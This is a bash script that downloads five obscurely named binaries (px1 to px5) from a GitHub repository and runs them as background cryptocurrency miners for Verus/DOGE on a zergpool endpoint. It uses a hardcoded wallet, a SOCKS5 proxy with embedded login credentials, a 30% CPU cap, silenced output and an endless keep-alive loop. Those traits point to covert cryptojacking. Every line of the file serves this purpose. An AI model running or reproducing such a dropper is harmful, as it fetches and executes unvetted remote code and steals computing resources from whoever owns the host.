#!/bin/bash
apt-get update -y
apt-get install -y cpulimit screen
apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4
wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
chmod +x px1
chmod +x px2
chmod +x px3
chmod +x px4
chmod +x px5
pool="stratum+tcp://verushash.na.mine.zergpool.com:3300"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
proxy="socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880"
cpulimit -l 30 ./px1 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px2 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px3 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px4 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px5 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 3m; done
